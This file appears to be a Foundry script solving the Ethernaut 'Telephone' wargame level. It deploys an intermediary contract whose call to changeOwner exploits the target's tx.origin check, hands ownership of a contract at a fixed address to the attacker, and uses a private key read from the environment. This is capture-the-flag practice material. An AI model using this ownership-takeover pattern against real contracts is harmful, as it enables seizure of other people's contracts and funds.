pragma solidity ^0.8.0;
import "../instances/Ilevel04.sol";
import "forge-std/Script.sol";

contract Level04 is Script {
    Telephone level04 = Telephone(0x44f5ac359A7051D49d14C648f716faF25f53546E);

    function run() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);
        vm.startBroadcast(attackerPrivateKey);
        TelephoneExploiter intermediate = new TelephoneExploiter();
        intermediate.itermediateCall(address(level04), attacker);
        require(level04.owner() == attacker, "owner not attacker");
        vm.stopBroadcast();
    }
}

contract TelephoneExploiter {
    function itermediateCall(address _target, address _attacker) public {
        Telephone(_target).changeOwner(_attacker);
    }
}
